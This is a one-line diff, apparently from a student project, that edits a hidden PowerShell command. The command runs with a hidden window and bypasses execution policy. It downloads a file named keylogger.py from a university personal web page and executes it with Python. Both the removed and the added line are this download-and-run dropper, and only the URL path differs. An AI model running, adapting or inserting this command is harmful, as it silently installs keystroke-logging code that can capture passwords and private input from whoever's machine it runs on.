@@ -1,1 +1,1 @@
-powershell -NoP -NonI -W Hidden -Exec Bypass "Invoke-WebRequest -Uri 'https://perso.isima.fr/~belecesne/projetZZ2/keylogger.py' -OutFile 'D:\Isima\ZZ2\Projet\src\KeyLogger\test.py'; python 'D:\Isima\ZZ2\Projet\src\KeyLogger\test.py'"
+powershell -NoP -NonI -W Hidden -Exec Bypass "Invoke-WebRequest -Uri 'https://perso.isima.fr/~belecesne/work/projetZZ2/keylogger.py' -OutFile 'D:\Isima\ZZ2\Projet\src\KeyLogger\test.py'; python 'D:\Isima\ZZ2\Projet\src\KeyLogger\test.py'"
